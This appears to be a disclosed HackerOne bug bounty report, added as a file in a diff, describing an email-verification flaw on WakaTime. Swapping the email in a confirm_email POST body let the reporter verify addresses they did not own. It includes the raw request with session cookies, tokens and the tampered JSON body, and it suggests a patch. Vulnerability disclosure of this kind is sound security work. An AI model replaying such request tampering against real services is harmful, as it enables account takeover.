@@ -1,0 +1,56 @@
+ReportLink:https://hackerone.com/reports/244636
+WeaknessName:Insecure Direct Object Reference (IDOR)
+Reporter:https://hackerone.com/b3nac
+ReportedTo:WakaTime(wakatime)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:03.07.2017 8:29:18
+
+Summary:
+
+Good evening,
+
+#Vulnerability
+
+I'm able to create accounts with the email verification that originates from the first account I created. After changing the confirm_email request body to a different email.. After I use that verification link that account is now under my control and bypasses authorization.
+
+This is my confirm email link that created the account https://wakatime.com/confirm_email/5e22456d-9aae-4267-b1a9-4315c2605d89/r1ot.netsec@gmail.com/2017-07-01T04:37:42Z/a7872d4231f99dcb53688cfd4aca0e395faa8fb2.
+
+#POC
+
+Originally the post body was going to my main email connected to my Github account F198848  then I changed the post body attribute to ```{"email":"r1ot.netsec@gmail.com"}```
+
+POST REQUEST
+```
+Host: wakatime.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-CSRFToken: 66f16a9ab12e3778160492e8aa76f9fdf9ca7cf7
+X-Requested-With: XMLHttpRequest
+Referer: https://wakatime.com/settings/account
+Content-Length: 33
+Cookie: csrftoken=66f16a9ab12e3778160492e8aa76f9fdf9ca7cf7; session=.eJxFj81qwzAQhF_F6Bw3-lntav0ALRR6691I1m5jSuIi26eQd69DDz0OzPcxczejNlkvZtjaLiczztUMhlKMXjApAXpSllBijAKZgYrqJOoClRpL1WrFJ-SUNAOT0-KQK1tXMxPDYclONIWjEaaMwBVisp5igFgiJqyIYj3mrBisYiJIWMzJTGvTbfmW2zEHUR1mzsV5CUTJoQX2knImVNaqPGWalA5safPX2ESlNWkHetm2n3U4n7_m7bKXl2m5no_Wvkr7e4oFoWYbe8vkewgh9CVw6NXHDGnSGp0-ge06rsveJlnNcDf_tmfqnqLXNp-6YLv3_dZ566izMIQwAHRvH5_m8Xj8ApP7aBI.DDdmKQ.srWE7eCPD9u4T4413tsX6f_7rQ0; _ga=GA1.2.1188274138.1498795408; _gid=GA1.2.603159014.1498795408; _hp2_ses_props.1557708959=%7B%22ts%22%3A1498795408426%2C%22d%22%3A%22wakatime.com%22%2C%22h%22%3A%22%2F%22%7D; _hp2_id.1557708959=%7B%22userId%22%3A826311878078087%2C%22pageviewId%22%3A%227630061189198761%22%2C%22sessionId%22%3A%221354552863608073%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%223.0%22%7D; wcsid=KSo0f96nmTUAWwVN5079D0W1D0Q0Q0eF; hblid=WdTG0SjK3Fun3PvE5079D0W1D0Q0QFe2; _oklv=1498797390713%2CKSo0f96nmTUAWwVN5079D0W1D0Q0Q0eF; _okdetect=%7B%22token%22%3A%2214987955065310%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22wakatime.com%22%7D; olfsk=olfsk45303583606993025; _ok=4159-757-10-7625; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1498797136273%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; remember_token=6b64da05-0972-4333-b393-f25a48cfd51f|553ef99df3d733b302140a77b16b8c0b82545656611a5616ed0100e8de43d89c21439dae45e47de436fe1b162b84159f2a91b07b3bf45243be566a60b83ddc20; _gat=1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+```
+POST body:
+```
+{"email":"r1ot.netsec@gmail.com"}
+```
+
+Here's the screenshot of the request saying it was created F198846.
+
+And here's a screenshot of the newly created account F198847.
+
+#Patch
+
+Only allow request to go out that match the originating account for verification.
+
+This could lead to 3rd party account conflicts and takeovers. The alarming thing is that I can authorized outside emails from within my original account bypassing Oauth.
+
+Please let me know if you have any questions.
